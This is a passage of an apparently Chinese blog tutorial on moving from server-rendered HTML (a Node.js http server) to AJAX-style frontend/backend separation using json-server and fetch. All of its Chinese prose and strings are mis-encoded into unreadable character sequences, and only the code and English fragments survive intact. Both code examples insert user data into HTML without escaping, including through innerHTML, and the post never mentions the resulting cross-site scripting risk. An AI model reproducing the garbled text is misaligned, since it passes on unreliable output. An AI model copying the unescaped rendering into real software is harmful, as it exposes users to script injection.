åç«¯åªæä¾›åŸå§‹æ•°æ®ï¼ˆå¦‚JSON APIï¼‰ï¼Œè€Œå‰ç«¯é€šè¿‡å“åº”å¼ç³»ç»Ÿæ¥é©±åŠ¨è§†å›¾è‡ªåŠ¨åŒæ­¥ã€‚</li>
</ul>
<p>è€Œåœ¨è¿™ä¸¤æ¡è·¯èƒŒåï¼Œåæ˜ ç€å‰åç«¯èŒè´£åˆ’åˆ†ï¼ŒåŒæ—¶ä¹Ÿå‚¬ç”Ÿäº†ä»¥<code>Vue</code>å’Œ<code>React</code>ä¸ºä»£è¡¨çš„å‰ç«¯æŠ€æœ¯æ¡†æ¶é©å‘½ã€‚</p>
<h2 data-id="heading-1">æ—¶ä»£ä¸€ï¼šçº¯åç«¯æ¸²æŸ“ â€”â€” MVC æ¨¡å¼ä¸»å¯¼</h2>
<p>å‡å¦‚æœ‰ä¸€ä¸ªéœ€æ±‚å¦‚ï¼šå†™ä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ï¼Œå½“ç”¨æˆ·è®¿é—® <code>/</code> æˆ– <code>/users</code> è·¯å¾„æ—¶ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«ç”¨æˆ·åˆ—è¡¨çš„ HTML é¡µé¢ï¼Œå…¶ä»–è·¯å¾„åˆ™è¿”å› 404 é”™è¯¯ã€‚</p>
<p>åœ¨<code>Node.js</code>æ—©æœŸï¼Œå¦‚æœæˆ‘æƒ³å®ç°è¿™ä¸ªéœ€æ±‚ï¼Œé‚£ä¹ˆ<strong>åç«¯æ¸²æŸ“</strong>å°†æ˜¯ä¸äºŒä¹‹é€‰ã€‚</p>
<h3 data-id="heading-2">ä»£ç ç¤ºä¾‹ï¼šæ—©æœŸ Node.js å®ç°ç®€å•ç”¨æˆ·åˆ—è¡¨é¡µ</h3>
<p>é¦–å…ˆå°±æ˜¯å¼•å…¥ Node.js å†…ç½®æ¨¡å—<code>http</code>å’Œ<code>url</code>ï¼Œè€Œä½¿ç”¨çš„æ–¹æ³•åˆ™æ˜¯<strong>Node.jsæœ€æ—©çš„CommonJS æ¨¡å—ç³»ç»Ÿ</strong>ä¸­çš„ <code>require()</code>æ¥â€œå¯¼å…¥â€</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>); <span class="hljs-comment">// commonjs </span>
<span class="hljs-keyword">const</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">"url"</span>);   <span class="hljs-comment">// url</span>
</code></pre>
<ul>
<li><code>http</code>Â æ¨¡å—ï¼šç”¨äºåˆ›å»º HTTP æœåŠ¡å™¨ï¼ˆå¤„ç†è¯·æ±‚å’Œå“åº”ï¼‰ã€‚</li>
<li><code>url</code>Â æ¨¡å—ï¼šç”¨äºè§£ææµè§ˆå™¨å‘æ¥çš„ URL å­—ç¬¦ä¸²ï¼ˆå¦‚Â <code>/users?id=1</code>ï¼‰ã€‚</li>
</ul>
<hr/>
<p>ç„¶åå†å‡†å¤‡ä¸€äº›æ¨¡æ‹Ÿæ•°æ®</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> users = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">'123@qq.com'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'æå››'</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">'123456@qq.com'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'ç‹äº”'</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">'121@qq.com'</span> }
]
</code></pre>
<hr/>
<p>æ¥ä¸‹æ¥å°±è¦åˆ›å»ºç”Ÿæˆ HTML é¡µé¢çš„å‡½æ•°äº†</p>
<p>å…ˆä½¿ç”¨<code>.map()</code>æ–¹æ³•æ¥åŠ¨æ€ç”Ÿæˆè¡¨æ ¼è¡Œï¼Œå¯¹æ¯ä¸ªç”¨æˆ·ç”Ÿæˆä¸€è¡Œ HTML è¡¨æ ¼ï¼Œç”¨åå¼•å·æ¥æ’å…¥å˜é‡ï¼Œä½¿ç”¨ <code>.join('')</code>æ¥æ‹¼æ¥æ‰€æœ‰è¡Œï¼Œæœ€åè¿”è¿˜ä¸€ä¸ªå®Œæ•´çš„ HTML æ–‡æ¡£ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateUsersHtml</span>(<span class="hljs-params">users</span>) {
    <span class="hljs-keyword">const</span> userRows = users.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> <span class="hljs-string">`
        &lt;tr&gt;
            &lt;td&gt;<span class="hljs-subst">${user.id}</span>&lt;/td&gt;
            &lt;td&gt;<span class="hljs-subst">${user.name}</span>&lt;/td&gt;
            &lt;td&gt;<span class="hljs-subst">${user.email}</span>&lt;/td&gt;
        &lt;/tr&gt;
    `</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
    
    <span class="hljs-keyword">return</span> <span class="hljs-string">`
    &lt;!DOCTYPE html&gt;
    &lt;html lang="en"&gt;
    &lt;head&gt;
        &lt;meta charset="UTF-8"&gt;
        &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
        &lt;title&gt;User List&lt;/title&gt;
        &lt;style&gt;
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
            th { background-color: #f4f4f4; }
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Users&lt;/h1&gt;
        &lt;table&gt;
            &lt;thead&gt;
                &lt;tr&gt;
                    &lt;th&gt;ID&lt;/th&gt;
                    &lt;th&gt;Name&lt;/th&gt;
                    &lt;th&gt;Email&lt;/th&gt;
                &lt;/tr&gt;
            &lt;/thead&gt;
            &lt;tbody&gt;
                <span class="hljs-subst">${userRows}</span>
            &lt;/tbody&gt;
        &lt;/table&gt;
    &lt;/body&gt;
    &lt;/html&gt;
    `</span>;
}
</code></pre>
<hr/>
<p>æœ€åä¹Ÿæ˜¯æœ€é‡è¦çš„å°±æ˜¯åˆ›å»º HTTP æœåŠ¡å™¨äº†ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> parsedUrl = url.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">url</span>, <span class="hljs-literal">true</span>);
    
    <span class="hljs-keyword">if</span> (parsedUrl.<span class="hljs-property">pathname</span> === <span class="hljs-string">'/'</span> || parsedUrl.<span class="hljs-property">pathname</span> === <span class="hljs-string">'/users'</span>) {
        res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">200</span>;
        res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/html;charset=utf-8'</span>);
        <span class="hljs-keyword">const</span> html = <span class="hljs-title function_">generateUsersHtml</span>(users);
        res.<span class="hljs-title function_">end</span>(html);
    } <span class="hljs-keyword">else</span> {
        res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">404</span>;
        res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">"text/plain"</span>);
        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">'Not Found'</span>);
    }
});
</code></pre>
<p>å…³é”®æ¦‚å¿µè§£é‡Šï¼š</p>
<ul>
<li><code>req</code>ï¼ˆRequestï¼‰ï¼šç”¨æˆ·çš„è¯·æ±‚å¯¹è±¡ï¼ŒåŒ…å« URLã€æ–¹æ³•ã€å¤´ä¿¡æ¯ç­‰ã€‚</li>
<li><code>res</code>ï¼ˆResponseï¼‰ï¼šä½ è¦è¿”å›ç»™ç”¨æˆ·çš„å†…å®¹ï¼Œé€šè¿‡å®ƒè®¾ç½®çŠ¶æ€ç ã€å¤´ã€æ­£æ–‡ã€‚</li>
</ul>
<p><strong>è§£æ URL</strong>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// url.parse(pathname, query)</span>
<span class="hljs-keyword">const</span> parsedUrl = url.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">url</span>, <span class="hljs-literal">true</span>);
</code></pre>
<ul>
<li>
<p><code>req.url</code>å³ç”¨æˆ·è¯·æ±‚çš„ è·¯å¾„+å‚æ•°éƒ¨åˆ†</p>
</li>
<li>
<p><code>url.parse()</code>å°† URL å­—ç¬¦ä¸²â€œæ‹†è§£â€æˆç»“æ„åŒ–çš„å¯¹è±¡ï¼Œä»è€Œæ–¹ä¾¿è¯»å–ï¼Œå…¶ä¸­ï¼š</p>
<ul>
<li><code>pathname</code>: <strong>è·¯å¾„éƒ¨åˆ†</strong>ï¼ˆå¦‚Â <code>/users</code>ï¼‰</li>
<li><code>query</code>: <strong>æŸ¥è¯¢å‚æ•°</strong>ï¼ˆå¦‚Â <code>?id=1</code>å°±å˜æˆäº†<code>{ id: '1' }</code>ï¼‰ï¼Œè¿™é‡Œçš„<code>true</code>æ˜¯ç”¨äºåˆ¤æ–­ä½ æ˜¯å¦éœ€è¦è‡ªåŠ¨è§£æURLå‚æ•°éƒ¨åˆ†å¹¶è½¬æ¢ä¸ºå¯¹è±¡ï¼ˆé€šå¸¸ä¸º trueï¼‰</li>
</ul>
</li>
</ul>
<p><strong>è·¯ç”±åˆ¤æ–­ï¼ˆç®€å•è·¯ç”±ï¼‰</strong> ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (parsedUrl.<span class="hljs-property">pathname</span> === <span class="hljs-string">'/'</span> || parsedUrl.<span class="hljs-property">pathname</span> === <span class="hljs-string">'/users'</span>)
</code></pre>
<p>å¦‚æœè·¯å¾„æ˜¯æ ¹è·¯å¾„Â <code>/</code>Â æˆ–Â <code>/users</code>ï¼Œå°±æ˜¾ç¤ºç”¨æˆ·åˆ—è¡¨ï¼Œå¦åˆ™è¿”å› 404ã€‚</p>
<p><strong>æˆåŠŸå“åº”ï¼ˆ200ï¼‰</strong> ï¼š</p>
<pre><code class="hljs language-js" lang="js">res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// è®¾ç½®çŠ¶æ€ç ä¸º 200</span>
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/html;charset=utf-8'</span>);
<span class="hljs-keyword">const</span> html = <span class="hljs-title function_">generateUsersHtml</span>(users);
res.<span class="hljs-title function_">end</span>(html);
</code></pre>
<p>é€šè¿‡<code>.setHeader</code>å‘Šè¯‰æµè§ˆå™¨ï¼šâ€œæˆ‘è¿”å›çš„æ˜¯ HTMLï¼Œç”¨ UTF-8 ç¼–ç â€ã€‚</p>
<p>ç„¶ååˆ©ç”¨å‡½æ•°Â <code>generateUsersHtml(users)</code>ï¼Œä¼ å…¥ç”¨æˆ·æ•°æ®ï¼Œæœ€åè°ƒç”¨<code>res.end()</code>ç”Ÿæˆ HTML å¹¶å‘é€ã€‚</p>
<p><strong>é”™è¯¯å“åº”ï¼ˆ404 Not Foundï¼‰</strong> ï¼š</p>
<pre><code class="hljs language-js" lang="js">res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">404</span>;
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">"text/plain"</span>);
res.<span class="hljs-title function_">end</span>(<span class="hljs-string">'Not Found'</span>);
</code></pre>
<p>çŠ¶æ€ç  404 è¡¨ç¤ºâ€œé¡µé¢ä¸å­˜åœ¨â€ï¼Œå¦‚æœäº§ç”Ÿé”™è¯¯åˆ™è¿”è¿˜<code>Not Found</code>ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼š<code>url.parse()</code> æ˜¯æ—§ APIï¼Œç°ä»£å¼€å‘åŸºæœ¬å¼ƒç”¨</p>
</blockquote>
<hr/>
<p>Node.js HTTPæœåŠ¡å™¨å¯åŠ¨çš„æœ€åä¸€æ­¥</p>
<pre><code class="hljs language-js" lang="js">server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">1234</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Server is running on port 1234'</span>)
})
</code></pre>
<p>è®©æœåŠ¡å™¨ç›‘å¬Â <strong>1234 ç«¯å£</strong>ï¼ˆä»»æ„ä¿®æ”¹ï¼‰ã€‚æ­¤æ—¶å°±å¯ä»¥åœ¨æµè§ˆå™¨è®¿é—®ï¼š<code>http://localhost:1234</code>
æˆ–<code>http://localhost:1234/users</code>ï¼Œè€Œè®¿é—®å…¶ä»–è·¯å¾„ï¼ˆå¦‚Â <code>/about</code>ï¼‰ä¼šæ˜¾ç¤º â€œNot Foundâ€ã€‚</p>
<h3 data-id="heading-3">æ•ˆæœå›¾ï¼š</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7653e59e67ec46f8a6810a7bcb6801ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766050097&amp;x-signature=xc20zoVpoi5GT3Jo1yQvHK5USGE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">æ ¸å¿ƒç¼ºç‚¹ + æ—¶ä»£å±€é™æ€§ï¼š</h3>
<ol>
<li><strong>å‰åç«¯é«˜åº¦è€¦åˆï¼Œåä½œæ•ˆç‡ä½ä¸‹</strong>ï¼š</li>
</ol>
<p>HTML ç»“æ„ã€æ ·å¼ã€JavaScript é€»è¾‘å…¨éƒ¨ç¡¬ç¼–ç åœ¨ä¸€ä¸ªå‡½æ•°é‡Œï¼Œå¦‚æœè¦ä¿®æ”¹è¡¨æ ¼æ ·å¼ç­‰æ“ä½œï¼Œå°±å¾—ä¿®æ”¹è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”æ— æ³•å¤ç”¨ã€‚</p>
<p>è€Œè¿™ä¹Ÿå‡ ä¹å°†å‰åç«¯å·¥ç¨‹å¸ˆæ†ç»‘èµ·æ¥äº†ï¼š</p>
<ul>
<li>å‰ç«¯å·¥ç¨‹å¸ˆæ— æ³•ç‹¬ç«‹å¼€å‘æˆ–è°ƒè¯• UIï¼Œå¿…é¡»ä¾èµ–åç«¯æ¥å£å’Œæ¨¡æ¿</li>
<li>åç«¯å·¥ç¨‹å¸ˆè¢«è¿«å¤„ç†æœ¬åº”å±äºå‰ç«¯èŒƒç•´çš„å±•ç¤ºé€»è¾‘</li>
</ul>
<p>é˜»ç¢äº†å›¢é˜Ÿåä½œï¼Œè®©å‰åç«¯å·¥ç¨‹å¸ˆçš„å¼€å‘ä½“éªŒéƒ½æå·®ã€‚</p>
<ol start="2">
<li><strong>ç”¨æˆ·ä½“éªŒå—é™ï¼Œäº¤äº’èƒ½åŠ›å¼±</strong>ï¼š</li>
</ol>
<p>é¡µé¢å®Œå…¨ç”±æœåŠ¡ç«¯ç”Ÿæˆï¼Œæ¯æ¬¡è·³è½¬æˆ–æ“ä½œéƒ½éœ€<strong>æ•´é¡µåˆ·æ–°</strong>ï¼Œæ— æ³•å®ç°å±€éƒ¨æ›´æ–°ã€åŠ¨æ€åŠ è½½ã€è¡¨å•å®æ—¶æ ¡éªŒç­‰ç°ä»£ Web äº¤äº’ï¼Œå³ä½¿åªæ˜¯ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®ï¼Œä¹Ÿè¦é‡æ–°è¯·æ±‚æ•´ä¸ª HTML æ–‡æ¡£ã€‚</p>
<h2 data-id="heading-5">æ—¶ä»£äºŒï¼šè½¬æŠ˜ç‚¹ AJAX ä¸å‰åç«¯åˆ†ç¦»çš„è¯ç”Ÿ</h2>
<p>åœ¨ 2005 å¹´ä¹‹å‰ï¼ŒWeb åº”ç”¨åŸºæœ¬æ˜¯ï¼šç”¨æˆ·ç‚¹å‡» â†’ æµè§ˆå™¨å‘è¯·æ±‚ â†’ åç«¯ç”Ÿæˆå®Œæ•´ HTML â†’ è¿”å› â†’Â <strong>æ•´é¡µåˆ·æ–°</strong>
ï¼Œå¯¼è‡´ç”¨æˆ·æ¯æ¬¡äº¤äº’éƒ½åƒâ€œé‡æ–°æ‰“å¼€ä¸€ä¸ªé¡µé¢â€ï¼Œä½“éªŒæ„Ÿå¤§æ‰“æŠ˜æ‰£ã€‚</p>
<p>è½¬æŠ˜äº‹ä»¶ï¼šGoogle Mapsï¼ˆ2005ï¼‰é¦–æ¬¡å¤§è§„æ¨¡ä½¿ç”¨Â <strong>XMLHttpRequestï¼ˆXHRï¼‰</strong></p>
<ul>
<li>åœ°å›¾æ‹–æ‹½æ—¶<strong>ä¸åˆ·æ–°é¡µé¢</strong></li>
<li>åŠ¨æ€åŠ è½½æ–°åŒºåŸŸæ•°æ®</li>
<li>ç”¨æˆ·ä½“éªŒé£è·ƒ â†’ è¡Œä¸šéœ‡åŠ¨</li>
</ul>
<p>è¿™å°±æ˜¯ <strong>AJAXï¼ˆAsynchronous JavaScript and XMLï¼‰</strong> èŒƒå¼çš„è¯ç”Ÿâ€”â€”  <strong>â€œè®©ç½‘é¡µåƒæ¡Œé¢åº”ç”¨ä¸€æ ·æµç•…â€</strong></p>
<h3 data-id="heading-6">èŒƒå¼å¯¹æ¯”å†æ·±åŒ–</h3>



































<table><thead><tr><th>ç»´åº¦</th><th>åç«¯æ¸²æŸ“ï¼ˆä¼ ç»Ÿï¼‰</th><th>å‰åç«¯åˆ†ç¦»ï¼ˆAJAX æ—¶ä»£ï¼‰</th></tr></thead><tbody><tr><td><strong>èŒè´£åˆ’åˆ†</strong></td><td>åç«¯ä¸€å®¶ç‹¬å¤§</td><td>å‰ç«¯è´Ÿè´£ UI/äº¤äº’ï¼Œåç«¯è´Ÿè´£æ•°æ®/API</td></tr><tr><td><strong>å¼€å‘æ¨¡å¼</strong></td><td>å…¨æ ˆä¸€äººå¹²</td><td>å‰åç«¯å¹¶è¡Œå¼€å‘</td></tr><tr><td><strong>éƒ¨ç½²æ–¹å¼</strong></td><td>æœåŠ¡ç«¯éƒ¨ç½² HTML</td><td>å‰ç«¯é™æ€èµ„æºï¼ˆCDNï¼‰ï¼Œåç«¯ APIï¼ˆç‹¬ç«‹æœåŠ¡ï¼‰</td></tr><tr><td><strong>ç”¨æˆ·ä½“éªŒ</strong></td><td>å¡é¡¿ã€ç™½å±ã€è·³è½¬</td><td>æµç•…ã€å±€éƒ¨æ›´æ–°ã€SPAé›å½¢</td></tr><tr><td><strong>æŠ€æœ¯æ ˆ</strong></td><td>PHP/Java/Node + æ¨¡æ¿å¼•æ“</td><td>HTML/CSS/JS + REST API</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-7">ä»£ç ç¤ºä¾‹ï¼š</h3>
<p><strong>å·²ç»é…ç½®å¥½çš„ç¯å¢ƒ</strong></p>
<p>åœ¨åç«¯ backend æ–‡ä»¶å¤¹ä¸­åŒ…å«ä¸€ä¸ªå­˜å‚¨ç”¨æˆ·æ•°æ®çš„<code>db.json</code>æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"users"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¼ ä¸‰"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"email"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"123@qq.com"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æå››"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"email"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1232@qq.com"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç‹äº”"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"email"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"121@qq.com"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
<p>æ³¨ï¼š<code>json-server</code> ä¼šæŠŠ JSON çš„<strong>é¡¶å±‚ keyï¼ˆå¦‚ <code>"users"</code>ï¼‰è‡ªåŠ¨æ˜ å°„ä¸º RESTful è·¯ç”±</strong>ã€‚</p>
</blockquote>
<p><code>package.json</code>Â ä¸­çš„è„šæœ¬</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"json-server --watch db.json"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å°±ä½¿å¾—è¿è¡ŒÂ <code>npm run dev</code>Â æ—¶ï¼Œ<code>json-server</code>Â ä¼šç›‘å¬Â <code>backend/db.json</code>Â æ–‡ä»¶å˜åŒ–ï¼ˆ--watchï¼‰ï¼Œå¹¶ä¸”å¯åŠ¨ä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œé»˜è®¤ç«¯å£Â <strong>3000</strong>ã€‚ï¼ˆåˆ«å¿˜äº†å¯åŠ¨åç«¯æœåŠ¡å“¦~~ï¼‰</p>
<h4 data-id="heading-8">å‰ç«¯ä»£ç ï¼ˆé‡å¤´æˆï¼‰ï¼š</h4>
<p>åŸºç¡€é¡µé¢</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>User List<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">table</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-attribute">border-collapse</span>: collapse; <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>; }
        <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span> { <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span>; <span class="hljs-attribute">text-align</span>: left; }
        <span class="hljs-selector-tag">th</span> { <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f4f4f4</span>; }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Users<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ID<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><code>&lt;script&gt;</code>ä¸­çš„å†…éƒ¨é€»è¾‘</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// DOM ç¼–ç¨‹</span>
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'http://localhost:3000/users'</span>) <span class="hljs-comment">// å‘å‡ºè¯·æ±‚</span>
        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>()) <span class="hljs-comment">// å°† JSON å­—ç¬¦ä¸²è½¬ä¸º JS å¯¹è±¡æ•°ç»„</span>
        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
            <span class="hljs-keyword">const</span> tbody = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'tbody'</span>);
            tbody.<span class="hljs-property">innerHTML</span> = data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> <span class="hljs-string">`
                &lt;tr&gt;
                    &lt;td&gt;<span class="hljs-subst">${user.id}</span>&lt;/td&gt;
                    &lt;td&gt;<span class="hljs-subst">${user.name}</span>&lt;/td&gt;
                    &lt;td&gt;<span class="hljs-subst">${user.email}</span>&lt;/td&gt;
                &lt;/tr&gt;
            `</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
        })
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>åœ¨<code>.then(data =&gt; ...)</code>ä¸­çš„ <code>data</code> å°±æ˜¯ä¸Šä¸€æ­¥ <code>res.json()</code> è§£æçš„ç»“æœï¼Œå¹¶ä¸”é€šè¿‡ <code>.map()</code>ç”Ÿæˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œå†ç”¨<code>.join('')</code> æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œè€Œé€šè¿‡ <code>tbody.innerHTML</code> è®©æµè§ˆå™¨é‡æ–°è§£æå¹¶æ¸²æŸ“è¡¨æ ¼ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4244ce93f574814bbfcfddec1afc034~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766050097&amp;x-signature=hGohGpjkhp79sTZHuu3C6nc6Raw%3D" alt="tongyi-mermaid-2025-12-11-165610.png" loading="lazy"/></p>
<p><strong>è¿™ä»£è¡¨äº†â€œçº¯æ‰‹å·¥â€å‰åç«¯åˆ†ç¦»çš„èµ·ç‚¹</strong>ï¼š</p>
<ul>
<li>å‰ç«¯ä¸å†ä¾èµ–åç«¯å HTML</li>
<li>æ•°æ®é€šè¿‡Â <strong>JSON API</strong>Â è·å–</li>
<li>è§†å›¾ç”±Â <strong>JavaScript åŠ¨æ€ç”Ÿæˆ</strong></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16fc3d95407641f691a2ebec4e964a0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766050097&amp;x-signature=bPHBJ1rHPiF4kjKYwnGAFpql11o%3D" alt="image.png" loading="lazy"/></p>
